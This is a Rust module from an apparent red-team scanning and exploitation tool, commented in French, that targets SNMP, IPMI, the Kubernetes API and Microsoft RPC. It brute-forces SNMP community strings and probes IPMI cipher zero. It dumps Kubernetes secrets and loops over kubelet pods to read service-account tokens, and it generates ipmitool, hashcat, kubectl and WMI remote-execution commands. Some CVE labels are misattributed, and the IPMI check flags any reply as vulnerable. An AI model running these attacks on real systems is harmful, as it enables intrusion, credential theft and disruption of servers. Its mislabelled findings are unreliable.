//! DIAPILE — Protocoles réseau avancés
//!
//! Modules de scan/exploitation pour :
//! - SNMP v1/v2c/v3 — community string brute, MIB dump, CVE-2017-6736
//! - IPMI 2.0 — cipher-zero auth bypass (CVE-2013-4786), hash dump
//! - Kubernetes API — endpoint discovery, RBAC audit, secrets dump
//! - MS-RPC (port 135) — endpoint mapper, interface enumération, DCOM
//!
//! ⚠️ RÉSERVÉ AUX OPÉRATIONS RED TEAM AUTORISÉES.
#![allow(dead_code)]

use reqwest::Client;
use serde::{Deserialize, Serialize};
use std::collections::HashMap;
use tokio::io::{AsyncReadExt, AsyncWriteExt};
use tokio::net::{TcpStream, UdpSocket};
use tokio::time::{timeout, Duration};

// ─────────────────────────────────────────────────────────────────────────────
// Types communs
// ─────────────────────────────────────────────────────────────────────────────

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct AdvancedScanResult {
    pub target: String,
    pub protocol: String,
    pub port: u16,
    pub vulnerable: bool,
    pub severity: String,
    pub findings: Vec<AdvancedFinding>,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct AdvancedFinding {
    pub title: String,
    pub description: String,
    pub evidence: String,
    pub cve: Option<String>,
    pub cvss: f32,
    pub exploit_cmd: Vec<String>,
}

// ═════════════════════════════════════════════════════════════════════════════
// SNMP — Simple Network Management Protocol
// ═════════════════════════════════════════════════════════════════════════════

/// Community strings à tester (les plus communes)
pub fn snmp_community_strings() -> &'static [&'static str] {
    &[
        "public",
        "private",
        "community",
        "admin",
        "manager",
        "cisco",
        "router",
        "monitor",
        "snmpd",
        "agent",
        "read",
        "write",
        "readwrite",
        "default",
        "network",
        "secret",
        "password",
        "pass",
        "test",
        "guest",
        "switch",
        "hub",
        "access",
        "security",
        "backup",
    ]
}

/// PDU SNMP GetRequest minimal pour tester une community string
/// Version: v2c (0x01), OID: sysDescr (1.3.6.1.2.1.1.1.0)
fn build_snmp_get_request(community: &str, request_id: u32) -> Vec<u8> {
    // BER encoding of SNMP v2c GetRequest for sysDescr
    let comm = community.as_bytes();
    let rid = request_id.to_be_bytes();

    let mut pdu: Vec<u8> = Vec::new();

    // VarBind: OID sysDescr.0 = 1.3.6.1.2.1.1.1.0
    let oid: &[u8] = &[0x06, 0x08, 0x2b, 0x06, 0x01, 0x02, 0x01, 0x01, 0x01, 0x00];
    let null: &[u8] = &[0x05, 0x00];

    // VarBind sequence
    let mut varbind: Vec<u8> = Vec::new();
    varbind.extend_from_slice(oid);
    varbind.extend_from_slice(null);
    let varbind_seq = snmp_seq(&varbind);

    // VarBindList
    let varbind_list = snmp_seq(&varbind_seq);

    // GetRequest-PDU [0]
    let mut get_pdu = Vec::new();
    // request-id INTEGER
    get_pdu.extend_from_slice(&[0x02, 0x04]);
    get_pdu.extend_from_slice(&rid);
    // error-status INTEGER 0
    get_pdu.extend_from_slice(&[0x02, 0x01, 0x00]);
    // error-index INTEGER 0
    get_pdu.extend_from_slice(&[0x02, 0x01, 0x00]);
    get_pdu.extend_from_slice(&varbind_list);

    let get_pdu_tagged = snmp_tagged(0xa0, &get_pdu);

    // SNMP message
    let mut msg = Vec::new();
    // version INTEGER 1 (v2c)
    msg.extend_from_slice(&[0x02, 0x01, 0x01]);
    // community OCTET STRING
    msg.push(0x04);
    msg.push(comm.len() as u8);
    msg.extend_from_slice(comm);
    msg.extend_from_slice(&get_pdu_tagged);

    snmp_seq(&msg)
}

fn snmp_seq(data: &[u8]) -> Vec<u8> {
    snmp_tagged(0x30, data)
}
fn snmp_tagged(tag: u8, data: &[u8]) -> Vec<u8> {
    let mut out = vec![tag];
    let len = data.len();
    if len < 128 {
        out.push(len as u8);
    } else if len < 256 {
        out.extend_from_slice(&[0x81, len as u8]);
    } else {
        out.extend_from_slice(&[0x82, (len >> 8) as u8, (len & 0xff) as u8]);
    }
    out.extend_from_slice(data);
    out
}

/// Tente une connexion SNMP UDP avec une community string donnée.
/// Retourne Some(sysDescr) si la community est valide.
async fn snmp_probe(target: &str, port: u16, community: &str) -> Option<String> {
    let addr = format!("{}:{}", target, port);
    let socket = UdpSocket::bind("0.0.0.0:0").await.ok()?;
    let pkt = build_snmp_get_request(community, 0xDEADBEEF);

    socket.send_to(&pkt, &addr).await.ok()?;

    let mut buf = [0u8; 4096];
    let (n, _) = timeout(Duration::from_secs(3), socket.recv_from(&mut buf))
        .await
        .ok()?
        .ok()?;

    let resp = &buf[..n];
    // Valider qu'il s'agit bien d'une réponse SNMP (tag 0x30)
    if resp.first() != Some(&0x30) {
        return None;
    }

    // Extraire la valeur sysDescr (chercher OCTET STRING après l'OID)
    let text = resp
        .windows(2)
        .position(|w| w[0] == 0x04 && w[1] > 5)
        .and_then(|i| {
            let len = resp[i + 1] as usize;
            let start = i + 2;
            if start + len <= resp.len() {
                Some(String::from_utf8_lossy(&resp[start..start + len]).to_string())
            } else {
                None
            }
        })
        .unwrap_or_else(|| "(réponse reçue)".to_string());

    Some(text)
}

/// Scan SNMP complet : brute-force des community strings + dump MIB partiel
pub async fn scan_snmp(target: &str, port: u16) -> AdvancedScanResult {
    let mut result = AdvancedScanResult {
        target: target.to_string(),
        protocol: "SNMP".to_string(),
        port,
        vulnerable: false,
        severity: "INFO".to_string(),
        findings: Vec::new(),
    };

    println!(
        "  \x1b[36m[SNMP]\x1b[0m Brute-force community strings sur {}:{}",
        target, port
    );

    for community in snmp_community_strings() {
        if let Some(desc) = snmp_probe(target, port, community).await {
            let desc_short = desc.chars().take(120).collect::<String>();
            println!(
                "  \x1b[38;5;196m[SNMP HIT]\x1b[0m community='{}' sysDescr={}",
                community, desc_short
            );

            result.vulnerable = true;
            result.severity = "HIGH".to_string();
            result.findings.push(AdvancedFinding {
                title: format!("SNMP Community String '{}'", community),
                description: format!(
                    "Community string SNMP '{}' valide sur {}:{}. \
                     Permet la lecture de la MIB complète : topologie réseau, \
                     configuration interfaces, ARP table, processus actifs.",
                    community, target, port
                ),
                evidence: format!("sysDescr: {}", desc_short),
                cve: Some("CVE-2017-6736".to_string()),
                cvss: 7.5,
                exploit_cmd: vec![
                    format!("snmpwalk -v2c -c {} {} 1.3.6.1.2.1", community, target),
                    format!(
                        "snmpbulkwalk -v2c -c {} {} .1.3.6.1.2.1.1",
                        community, target
                    ),
                    format!(
                        "snmpget -v2c -c {} {} 1.3.6.1.2.1.1.5.0  # hostname",
                        community, target
                    ),
                    format!(
                        "snmpwalk -v2c -c {} {} 1.3.6.1.2.1.2.2   # interfaces",
                        community, target
                    ),
                    format!(
                        "snmpwalk -v2c -c {} {} 1.3.6.1.2.1.4.22  # ARP table",
                        community, target
                    ),
                    format!(
                        "onesixtyone -c /usr/share/doc/onesixtyone/dict.txt {}",
                        target
                    ),
                ],
            });

            // Vérifier si la community write est aussi valide
            if community == &"private" || community == &"write" || community == &"admin" {
                result.findings.push(AdvancedFinding {
                    title: format!("SNMP Write Community '{}' — Risque RCE", community),
                    description: "Community string avec accès en écriture. \
                                  Permet de modifier la configuration de l'équipement réseau \
                                  (routing table, firmware download via TFTP)."
                        .to_string(),
                    evidence: format!("Community write '{}' acceptée", community),
                    cve: None,
                    cvss: 9.8,
                    exploit_cmd: vec![
                        format!(
                            "snmpset -v2c -c {} {} 1.3.6.1.4.1.X.X.X s 'payload'",
                            community, target
                        ),
                        "# Cisco: modifier tftp-server pour upload firmware malveillant"
                            .to_string(),
                    ],
                });
            }
            break; // On a trouvé une community valide, on peut s'arrêter
        }
    }

    if !result.vulnerable {
        println!(
            "  \x1b[90m[SNMP]\x1b[0m Aucune community valide trouvée sur {}:{}",
            target, port
        );
    }
    result
}

// ═════════════════════════════════════════════════════════════════════════════
// IPMI 2.0 — Intelligent Platform Management Interface
// CVE-2013-4786 : Cipher Zero authentication bypass
// ═════════════════════════════════════════════════════════════════════════════

/// Paquet IPMI RAKP Get Session Challenge (simplifié)
/// Utilisé pour obtenir le hash du mot de passe administrateur
fn build_ipmi_rakp1_packet() -> Vec<u8> {
    // RMCP header + IPMI session + RAKP Message 1
    // Permet de récupérer le hash HMAC-SHA1 du mot de passe admin
    vec![
        // RMCP header
        0x06, 0x00, 0xff, 0x07, // IPMI v2.0 / RMCP+ session header
        0x06, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x09, 0x20, 0x18,
        // Open Session Request
        0xc0, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
        // Authentication type: 0x00 (none — cipher zero)
        0x00, 0x00, 0x00, 0x08, 0x01, 0x00, 0x00, 0x00, // Integrity: none
        0x01, 0x00, 0x00, 0x08, 0x01, 0x00, 0x00, 0x00, // Confidentiality: none
        0x02, 0x00, 0x00, 0x08, 0x01, 0x00, 0x00, 0x00,
    ]
}

/// Scan IPMI : détecte CVE-2013-4786 (cipher zero) et génère les commandes d'exploitation
pub async fn scan_ipmi(target: &str, port: u16) -> AdvancedScanResult {
    let mut result = AdvancedScanResult {
        target: target.to_string(),
        protocol: "IPMI".to_string(),
        port,
        vulnerable: false,
        severity: "INFO".to_string(),
        findings: Vec::new(),
    };

    println!(
        "  \x1b[36m[IPMI]\x1b[0m Probe CVE-2013-4786 (cipher-zero) sur {}:{}",
        target, port
    );

    let addr = format!("{}:{}", target, port);
    let socket = match UdpSocket::bind("0.0.0.0:0").await {
        Ok(s) => s,
        Err(e) => {
            println!(
                "  \x1b[90m[IPMI]\x1b[0m Impossible de créer socket UDP: {}",
                e
            );
            return result;
        }
    };

    let pkt = build_ipmi_rakp1_packet();
    if socket.send_to(&pkt, &addr).await.is_err() {
        return result;
    }

    let mut buf = [0u8; 1024];
    let reachable = timeout(Duration::from_secs(3), socket.recv_from(&mut buf))
        .await
        .is_ok();

    if reachable {
        result.vulnerable = true;
        result.severity = "CRITICAL".to_string();
        println!(
            "  \x1b[38;5;196m[IPMI VULN]\x1b[0m {}:{} répond — CVE-2013-4786 probable",
            target, port
        );

        result.findings.push(AdvancedFinding {
            title:       "IPMI 2.0 Cipher Zero Auth Bypass (CVE-2013-4786)".to_string(),
            description: "IPMI 2.0 avec cipher 0 permet d'authentifier avec n'importe quel mot de passe \
                          et d'obtenir les hashes HMAC-SHA1 des comptes administrateurs \
                          pour crack offline. \
                          Exploitation complète possible : accès BMC, console KVM, gestion alimentation.".to_string(),
            evidence:    format!("IPMI service UDP {} répond aux requêtes RMCP+", port),
            cve:         Some("CVE-2013-4786".to_string()),
            cvss:        10.0,
            exploit_cmd: vec![
                format!("# Dump des hashes IPMI via ipmitool cipher 0"),
                format!("ipmitool -I lanplus -H {} -U admin -P '' -C 0 mc info", target),
                format!("ipmitool -I lanplus -H {} -U admin -P '' -C 0 user list", target),
                format!("# Hashcat pour crack des hashes RAKP"),
                format!("python ipmi_dumphashes.py -target {} -outputfile ipmi_hashes.txt", target),
                format!("hashcat -m 7300 ipmi_hashes.txt rockyou.txt"),
                format!("# Après crack: accès complet BMC"),
                format!("ipmitool -I lanplus -H {} -U admin -P <cracked_pass> chassis status", target),
                format!("ipmitool -I lanplus -H {} -U admin -P <cracked_pass> power cycle", target),
            ],
        });

        // IPMI anonyme
        result.findings.push(AdvancedFinding {
            title: "IPMI Accès Anonymous Potentiel".to_string(),
            description:
                "Certaines implémentations IPMI acceptent un login anonyme (username vide)."
                    .to_string(),
            evidence: format!("Service IPMI actif sur {}", target),
            cve: None,
            cvss: 9.8,
            exploit_cmd: vec![
                format!(
                    "ipmitool -I lanplus -H {} -U '' -P '' user list 2>/dev/null",
                    target
                ),
                format!(
                    "ipmitool -I lanplus -H {} -U '' -P '' mc info 2>/dev/null",
                    target
                ),
            ],
        });
    }
    result
}

// ═════════════════════════════════════════════════════════════════════════════
// Kubernetes API — Enum RBAC, secrets, pods
// ═════════════════════════════════════════════════════════════════════════════

/// Scan Kubernetes API : détecte les endpoints non authentifiés, dump secrets
pub async fn scan_kubernetes(target: &str) -> AdvancedScanResult {
    let mut result = AdvancedScanResult {
        target: target.to_string(),
        protocol: "Kubernetes API".to_string(),
        port: 0,
        vulnerable: false,
        severity: "INFO".to_string(),
        findings: Vec::new(),
    };

    let client = Client::builder()
        .timeout(Duration::from_secs(8))
        .danger_accept_invalid_certs(true)
        .build()
        .unwrap_or_default();

    // Endpoints à tester (6443 = API server, 8080 = insecure)
    let endpoints: &[(&str, u16, bool)] = &[
        ("https", 6443, false),
        ("http", 8080, true), // insecure port (souvent non auth)
        ("https", 8443, false),
        ("http", 10250, true), // kubelet API
        ("https", 10250, false),
    ];

    for (scheme, port, is_insecure) in endpoints {
        let base = format!("{}://{}:{}", scheme, target, port);

        // Test /version (endpoint public)
        let version_url = format!("{}/version", base);
        let resp = match client.get(&version_url).send().await {
            Ok(r) => r,
            Err(_) => continue,
        };

        if resp.status().is_success() {
            let body = resp.text().await.unwrap_or_default();
            result.port = *port;

            if body.contains("gitVersion") || body.contains("major") {
                println!(
                    "  \x1b[38;5;196m[K8S HIT]\x1b[0m API Kubernetes sur {} (port {})",
                    target, port
                );
                result.vulnerable = true;
                result.severity = if *is_insecure { "CRITICAL" } else { "HIGH" }.to_string();

                // Extraire la version
                let version = body
                    .lines()
                    .find(|l| l.contains("gitVersion"))
                    .and_then(|l| l.split('"').nth(3))
                    .unwrap_or("unknown")
                    .to_string();

                result.findings.push(AdvancedFinding {
                    title:       format!("Kubernetes API {} accessible ({})", if *is_insecure { "non authentifiée" } else { "détectée" }, version),
                    description: format!(
                        "L'API Kubernetes est accessible sur {}:{}. {}. \
                         Version: {}.",
                        target, port,
                        if *is_insecure {
                            "Port insécurisé sans authentification — accès complet au cluster"
                        } else {
                            "API sécurisée mais accessible — vérifier les permissions RBAC"
                        },
                        version
                    ),
                    evidence:    format!("/version répond: {}", &body[..body.len().min(200)]),
                    cve:         None,
                    cvss:        if *is_insecure { 10.0 } else { 6.5 },
                    exploit_cmd: vec![
                        format!("kubectl --server={}://{}:{} --insecure-skip-tls-verify get nodes", scheme, target, port),
                        format!("kubectl --server={}://{}:{} --insecure-skip-tls-verify get pods --all-namespaces", scheme, target, port),
                        format!("kubectl --server={}://{}:{} --insecure-skip-tls-verify get secrets --all-namespaces", scheme, target, port),
                        format!("kubectl --server={}://{}:{} --insecure-skip-tls-verify auth can-i --list", scheme, target, port),
                    ],
                });

                // Tester les endpoints sensibles
                let sensitive_paths = [
                    (
                        "/api/v1/secrets",
                        "Secrets Kubernetes (tokens, credentials)",
                    ),
                    ("/api/v1/namespaces", "Liste des namespaces"),
                    ("/api/v1/pods", "Liste des pods"),
                    ("/api/v1/configmaps", "ConfigMaps (possibles secrets)"),
                    ("/api/v1/serviceaccounts", "Service Accounts"),
                    (
                        "/apis/rbac.authorization.k8s.io/v1/clusterrolebindings",
                        "RBAC bindings",
                    ),
                    ("/api/v1/nodes", "Nodes du cluster"),
                ];

                for (path, description) in &sensitive_paths {
                    let url = format!("{}{}", base, path);
                    if let Ok(r) = client.get(&url).send().await {
                        let status = r.status().as_u16();
                        if status == 200 {
                            let body = r.text().await.unwrap_or_default();
                            let count = body.matches("\"name\"").count();
                            println!("  \x1b[38;5;196m[K8S]\x1b[0m {} → {} items", path, count);
                            result.findings.push(AdvancedFinding {
                                title: format!("K8S Unauthenticated Access: {}", description),
                                description: format!(
                                    "{} accessible sans authentification. {} items détectés.",
                                    description, count
                                ),
                                evidence: format!("GET {} → 200 OK ({} items)", path, count),
                                cve: None,
                                cvss: 9.1,
                                exploit_cmd: vec![
                                    format!(
                                        "kubectl --server={} get {} --all-namespaces -o yaml",
                                        base,
                                        path.trim_start_matches("/api/v1/")
                                    ),
                                    format!(
                                        "curl -sk {}{} | jq '.items[].metadata.name'",
                                        base, path
                                    ),
                                ],
                            });
                        } else if status == 401 || status == 403 {
                            // Auth required — documenter pour RBAC audit
                        }
                    }
                }

                // Kubelet API direct (port 10250) — exec dans les conteneurs
                if *port == 10250 {
                    let pods_url = format!("{}/pods", base);
                    if let Ok(r) = client.get(&pods_url).send().await {
                        if r.status().is_success() {
                            result.findings.push(AdvancedFinding {
                                title:       "Kubelet API non authentifiée (port 10250)".to_string(),
                                description: "La kubelet API est accessible sans authentification. \
                                              Permet d'exécuter des commandes dans tous les conteneurs du nœud.".to_string(),
                                evidence:    format!("/pods accessible sur kubelet {}:{}", target, port),
                                cve:         Some("CVE-2019-11248".to_string()),
                                cvss:        10.0,
                                exploit_cmd: vec![
                                    format!("curl -sk https://{}:10250/pods | jq '.items[].metadata.name'", target),
                                    format!("curl -sk https://{}:10250/run/<namespace>/<pod>/<container> -d 'cmd=id'", target),
                                    format!("# Extraction token depuis tous les pods"),
                                    format!("for pod in $(curl -sk https://{}:10250/pods | jq -r '.items[].metadata.name'); do curl -sk https://{}:10250/run/default/$pod/main -d 'cmd=cat /run/secrets/kubernetes.io/serviceaccount/token'; done", target, target),
                                ],
                            });
                        }
                    }
                }
                break;
            }
        }
    }
    result
}

// ═════════════════════════════════════════════════════════════════════════════
// MS-RPC — Microsoft Remote Procedure Call (port 135)
// Énumération des endpoints RPC, DCOM, WMI
// ═════════════════════════════════════════════════════════════════════════════

/// Requête RPC Bind minimale pour le service Endpoint Mapper
fn build_rpc_bind_request() -> Vec<u8> {
    // MSRPCv5 Bind request pour l'interface EPMAPPER
    // UUID: E1AF8308-5D1F-11C9-91A4-08002B14A0FA (EPMAPPER v3.0)
    vec![
        // MSRPC header
        0x05, 0x00, // version 5.0
        0x0b, // BIND
        0x03, // flags: first+last
        0x10, 0x00, 0x00, 0x00, // little-endian
        0x48, 0x00, // frag_length
        0x00, 0x00, // auth_length
        0x01, 0x00, 0x00, 0x00, // call_id
        // Bind body
        0xb8, 0x10, // max_xmit_frag
        0xb8, 0x10, // max_recv_frag
        0x00, 0x00, 0x00, 0x00, // assoc_group
        0x01, 0x00, 0x00, 0x00, // num_ctx_items
        // Context item
        0x00, 0x00, // context_id
        0x01, 0x00, // num_trans_items
        // EPMAPPER interface UUID
        0x08, 0x83, 0xaf, 0xe1, 0x1f, 0x5d, 0xc9, 0x11, 0x91, 0xa4, 0x08, 0x00, 0x2b, 0x14, 0xa0,
        0xfa, 0x03, 0x00, // if_version 3.0
        0x00, 0x00, // Transfer syntax: NDR64 or NDR
        0x04, 0x5d, 0x88, 0x8a, 0xeb, 0x1c, 0xc9, 0x11, 0x9f, 0xe8, 0x08, 0x00, 0x2b, 0x10, 0x48,
        0x60, 0x02, 0x00, 0x00, 0x00,
    ]
}

/// Parse la réponse RPC Bind pour vérifier si la connexion est acceptée
fn parse_rpc_bind_ack(data: &[u8]) -> bool {
    data.len() > 2 && data[0] == 0x05 && data[2] == 0x0c // MSRPC BIND_ACK
}

/// Scan MS-RPC : énumération des endpoints, vérification WMI/DCOM
pub async fn scan_msrpc(target: &str) -> AdvancedScanResult {
    let mut result = AdvancedScanResult {
        target: target.to_string(),
        protocol: "MS-RPC".to_string(),
        port: 135,
        vulnerable: false,
        severity: "INFO".to_string(),
        findings: Vec::new(),
    };

    println!(
        "  \x1b[36m[MS-RPC]\x1b[0m Probe Endpoint Mapper sur {}:135",
        target
    );

    let addr = format!("{}:135", target);
    let stream = match timeout(Duration::from_secs(5), TcpStream::connect(&addr)).await {
        Ok(Ok(s)) => s,
        _ => {
            println!(
                "  \x1b[90m[MS-RPC]\x1b[0m Port 135 fermé ou filtré sur {}",
                target
            );
            return result;
        }
    };

    let (mut reader, mut writer) = stream.into_split();

    // Envoyer le Bind Request
    let bind_req = build_rpc_bind_request();
    if writer.write_all(&bind_req).await.is_err() {
        return result;
    }

    let mut buf = [0u8; 4096];
    let bind_ack = match timeout(Duration::from_secs(5), reader.read(&mut buf)).await {
        Ok(Ok(n)) if n > 0 => parse_rpc_bind_ack(&buf[..n]),
        _ => false,
    };

    result.port = 135;

    if bind_ack {
        println!(
            "  \x1b[38;5;196m[MS-RPC]\x1b[0m EPMAPPER actif sur {} — Windows détecté",
            target
        );
        result.vulnerable = true;
        result.severity = "MEDIUM".to_string();

        result.findings.push(AdvancedFinding {
            title: "MS-RPC Endpoint Mapper accessible".to_string(),
            description: "Le service Endpoint Mapper RPC est actif. \
                          Permet d'énumérer tous les services RPC/DCOM disponibles sur la machine, \
                          incluant WMI, DCOM, Task Scheduler, etc. \
                          Peut être utilisé pour l'exécution de code à distance via DCOM."
                .to_string(),
            evidence: format!("MSRPC BIND_ACK reçu de {}:135", target),
            cve: None,
            cvss: 5.3,
            exploit_cmd: vec![
                format!("rpcclient -U '' {}  # Null session", target),
                format!("rpcclient -U '' {} -c 'enumdomusers'", target),
                format!("impacket-rpcdump {}:135", target),
                format!(
                    "impacket-rpcmap -brute-opnums ncacn_ip_tcp:{}\\[135\\]",
                    target
                ),
                format!("python IOXIDResolver.py -t {}", target), // CVE-2021-26857
            ],
        });

        // Tester WMI (port 135 + ports dynamiques)
        result.findings.push(AdvancedFinding {
            title: "WMI Remote Execution potentiel via DCOM".to_string(),
            description: "WMI est disponible via RPC/DCOM. Avec des credentials valides, \
                          permet l'exécution de commandes à distance sans outil tiers."
                .to_string(),
            evidence: format!("DCOM actif sur {}", target),
            cve: None,
            cvss: 7.2,
            exploit_cmd: vec![
                format!("impacket-wmiexec DOMAIN/user:password@{} 'whoami'", target),
                format!(
                    "wmic /node:{} /user:user /password:pass process call create 'cmd /c whoami'",
                    target
                ),
                format!("impacket-dcomexec DOMAIN/user:password@{} 'whoami'", target),
            ],
        });

        // Tester la null session
        let null_addr = format!("{}:445", target);
        if timeout(Duration::from_secs(3), TcpStream::connect(&null_addr))
            .await
            .map(|r| r.is_ok())
            .unwrap_or(false)
        {
            result.findings.push(AdvancedFinding {
                title:       "Null Session SMB + RPC possible".to_string(),
                description: "SMB et RPC actifs — possible null session pour énumération \
                              des utilisateurs, partages, et politiques de sécurité sans authentification.".to_string(),
                evidence:    format!("SMB port 445 ouvert sur {}", target),
                cve:         None,
                cvss:        6.5,
                exploit_cmd: vec![
                    format!("enum4linux -a {}", target),
                    format!("rpcclient -U '' -N {} -c 'querydispinfo'", target),
                    format!("net use \\\\{}\\IPC$ '' /user:''", target),
                    format!("impacket-lookupsid {}/ 2>/dev/null", target),
                ],
            });
        }
    } else {
        println!(
            "  \x1b[90m[MS-RPC]\x1b[0m Pas de réponse BIND_ACK de {}:135",
            target
        );
    }
    result
}

// ═════════════════════════════════════════════════════════════════════════════
// Scan global : tous les protocoles avancés en parallèle
// ═════════════════════════════════════════════════════════════════════════════

/// Lance tous les scans de protocoles avancés sur une cible en parallèle.
/// Retourne les résultats agrégés.
pub async fn scan_all_advanced(target: &str) -> Vec<AdvancedScanResult> {
    println!(
        "\n  \x1b[38;5;196m[ADVANCED]\x1b[0m Scan protocoles avancés sur {}",
        target
    );

    let (snmp_r, ipmi_r, k8s_r, rpc_r) = tokio::join!(
        scan_snmp(target, 161),
        scan_ipmi(target, 623),
        scan_kubernetes(target),
        scan_msrpc(target),
    );

    let results = vec![snmp_r, ipmi_r, k8s_r, rpc_r];

    let vuln_count = results.iter().filter(|r| r.vulnerable).count();
    let finding_count: usize = results.iter().map(|r| r.findings.len()).sum();

    println!(
        "  \x1b[36m[ADVANCED]\x1b[0m {} protocoles vulnérables, {} findings",
        vuln_count, finding_count
    );

    results
}

/// Affiche un résumé coloré des résultats de scan avancé
pub fn print_advanced_results(results: &[AdvancedScanResult]) {
    let fire = "\x1b[38;5;196m";
    let cyan = "\x1b[36m";
    let amber = "\x1b[33m";
    let dim = "\x1b[90m";
    let reset = "\x1b[0m";

    for result in results {
        if result.findings.is_empty() {
            continue;
        }

        let icon = match result.severity.as_str() {
            "CRITICAL" => "🔴",
            "HIGH" => "🟠",
            "MEDIUM" => "🟡",
            _ => "🟢",
        };
        println!(
            "\n{} {} {}:{} [{}]{}",
            icon, fire, result.target, result.port, result.protocol, reset
        );

        for finding in &result.findings {
            println!(
                "  {} [CVSS {:.1}] {}{}",
                amber, finding.cvss, finding.title, reset
            );
            println!(
                "  {} {}{}",
                dim,
                &finding.description[..finding.description.len().min(120)],
                reset
            );
            if let Some(cve) = &finding.cve {
                println!("  {}CVE: {}{}", cyan, cve, reset);
            }
            if !finding.exploit_cmd.is_empty() {
                println!("  {}Commandes:{}", dim, reset);
                for cmd in finding.exploit_cmd.iter().take(3) {
                    println!("    {} ${} {}{}", dim, reset, cmd, reset);
                }
            }
        }
    }
}
